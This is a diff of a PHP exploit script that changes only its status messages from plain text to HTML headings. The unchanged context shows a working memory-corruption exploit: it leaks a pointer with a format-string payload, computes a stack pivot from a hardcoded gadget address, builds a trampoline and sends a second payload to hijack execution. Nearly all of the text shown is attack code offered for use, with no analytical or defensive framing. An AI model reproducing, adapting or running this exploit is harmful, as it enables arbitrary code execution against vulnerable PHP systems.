@@ -58,7 +58,7 @@ function overwrite($which, $str, $offset) {
 
 }
 
-echo "> Setting up payloads\n";
+echo "<h1> Setting up payloads </h1>";
 
 //$stack_pivot_1 = pack("L", 0x41414141); // Just get EIP, no exploit
 $stack_pivot_1 = pack("L", 0x0807c19f);	// xchg esp ebx
@@ -91,21 +91,21 @@ $payload_2 =
 	str_repeat("%d", 13) . "%Z";	// trigger the exploit
 
 // leak a pointer
-echo "> Attempting to leak a pointer\n";
+echo "<h3> Attempting to leak a pointer </h3>";
 $data = trigger($payload_1);
 $trampoline_ptr = (int)hexdec((explode("w00t", $data)[1])) + $trampoline_offset;
-echo "> Leaked pointer: 0x" . dechex($trampoline_ptr) . "\n";
+echo "<h3> Leaked pointer: 0x" . dechex($trampoline_ptr) . "</h3>";
 
 // If there are any null bytes or percent signs in the pointer, it will break
 // the -0x10 will be applied later, so do it now too
 if(strpos(pack("L", $trampoline_ptr - 0x10), "\x00") !== false
 || strpos(pack("L", $trampoline_ptr - 0x10), "%") !== false) {
-	echo "> That pointer has a bad character in it\n";
-	echo "> This won't work.  Bailing out... :(\n";
+	echo "<h3> That pointer has a bad character in it </h3>";
+	echo "<h3> This won't work.  Bailing out... :(</h3>";
 	exit(0);
 }
 
-echo "> Overwriting payload with calculated offsets\n";
+echo "<h3> Overwriting payload with calculated offsets </h3>";
 // prepare the trampoline
 // code looks kinda like...
 //   mov eax, [eax+0x10]
@@ -120,4 +120,5 @@ trigger($payload_2);
 
 // if we make it here, something didn't work
 echo "> Exploit failed :(\n";
-            ?>
+
+?>
